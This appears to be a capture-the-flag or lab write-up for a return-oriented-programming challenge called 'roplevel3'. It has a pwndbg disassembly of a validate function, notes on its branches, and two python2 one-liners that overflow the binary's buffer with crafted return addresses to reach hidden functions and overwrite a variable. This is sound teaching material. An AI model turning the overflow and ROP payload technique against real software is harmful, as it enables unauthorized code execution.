### Analysis

```
pwndbg> disas validate
Dump of assembler code for function validate:
   0x0804928b <+0>:	push   ebp
   0x0804928c <+1>:	mov    ebp,esp
   0x0804928e <+3>:	push   ebx
   0x0804928f <+4>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x08049294 <+9>:	add    ebx,0x2244
   0x0804929a <+15>:	lea    eax,[ebx-0x13d8]
   0x080492a0 <+21>:	push   eax
   0x080492a1 <+22>:	push   DWORD PTR [ebp+0x8]
   0x080492a4 <+25>:	call   0x8049030 <strcmp@plt>
   0x080492a9 <+30>:	add    esp,0x8
   0x080492ac <+33>:	test   eax,eax
   0x080492ae <+35>:	jne    0x80492b7 <validate+44>
   0x080492b0 <+37>:	call   0x80491b6 <func>
   0x080492b5 <+42>:	jmp    0x804931b <validate+144>
   0x080492b7 <+44>:	lea    eax,[ebx-0x13ba]
   0x080492bd <+50>:	push   eax
   0x080492be <+51>:	push   DWORD PTR [ebp+0x8]
   0x080492c1 <+54>:	call   0x8049030 <strcmp@plt>
   0x080492c6 <+59>:	add    esp,0x8
   0x080492c9 <+62>:	test   eax,eax
   0x080492cb <+64>:	jne    0x80492ef <validate+100>
   0x080492cd <+66>:	mov    eax,DWORD PTR [ebx+0x34]
   0x080492d3 <+72>:	test   eax,eax
   0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
   0x080492d7 <+76>:	lea    eax,[ebx-0x139c]
   0x080492dd <+82>:	push   eax
   0x080492de <+83>:	call   0x8049050 <puts@plt>
   0x080492e3 <+88>:	add    esp,0x4
   0x080492e6 <+91>:	jmp    0x804931b <validate+144>
   0x080492e8 <+93>:	call   0x80491db <func_internal>
   0x080492ed <+98>:	jmp    0x804931b <validate+144>
=> 0x080492ef <+100>:	lea    eax,[ebx-0x13b0]
   0x080492f5 <+106>:	push   eax
   0x080492f6 <+107>:	push   DWORD PTR [ebp+0x8]
   0x080492f9 <+110>:	call   0x8049030 <strcmp@plt>
   0x080492fe <+115>:	add    esp,0x8
   0x08049301 <+118>:	test   eax,eax
   0x08049303 <+120>:	jne    0x804930c <validate+129>
   0x08049305 <+122>:	push   0x0
   0x08049307 <+124>:	call   0x8049070 <exit@plt>
   0x0804930c <+129>:	lea    eax,[ebx-0x1368]
   0x08049312 <+135>:	push   eax
   0x08049313 <+136>:	call   0x8049050 <puts@plt>
   0x08049318 <+141>:	add    esp,0x4
   0x0804931b <+144>:	nop
   0x0804931c <+145>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804931f <+148>:	leave  
   0x08049320 <+149>:	ret    
End of assembler dump.
```

>0x080492ae <+35>:	jne    0x80492b7 <validate+44>
>
>checks if the number is 1, 
>
>if it is call func then ret and jmp to validate+144 (end)
>
>if it is not jmp to validate+44 and continue
>
> </br>
>0x080492cb <+64>:	jne    0x80492ef <validate+100> 
>
>Checks if the number is 2,
>
>if it is continue
>
>if it is not jmp to 100
>
> </br>
>0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
>
>check if eax is not 0
>
>if eax is not 0 then execute internal_func
>
>if eax is 0 then jmp to validate+144 (end)
>
> </br>
>0x08049303 <+120>:	jne    0x804930c <validate+129>
>
>check if number is 3
>
>if it is 3 then continue and eventually exit
>
>if it is not 3 then continue to validate+129 then to validate+144 (end)

### Answer:



(python2 -c "print('ZZZZYYYYXXXXVVVV' + 'BBBB' + '\x33\x93\x04\x08' + 'CCCC' + '\x21\x93\x04\x08' + '\x44\x93\x04\x08')" ; cat)  | ./roplevel3



https://stackoverflow.com/questions/19398216/why-is-there-a-expecting-comma-error-in-y86-code

https://stackoverflow.com/questions/9617877/assembly-jg-jnle-jl-jnge-after-cmp

https://stackoverflow.com/questions/6261392/printing-all-global-variables-local-variables

https://stackoverflow.com/questions/52024529/whats-the-difference-between-nexti-and-stepi-in-gdb

print (int) internal_mode

(python2 -c "print('ZZZZYYYYXXXX' + '\x28\xb5\x04\x08' + 'BBBB' + '\x34\x93\x04\x08' + 'AAAA' + '\x21\x93\x04\x08' + '\x45\x93\x04\x08')" ; cat) | ./roplevel3

overwrite internal_mode with BBBB

last address is address to main function
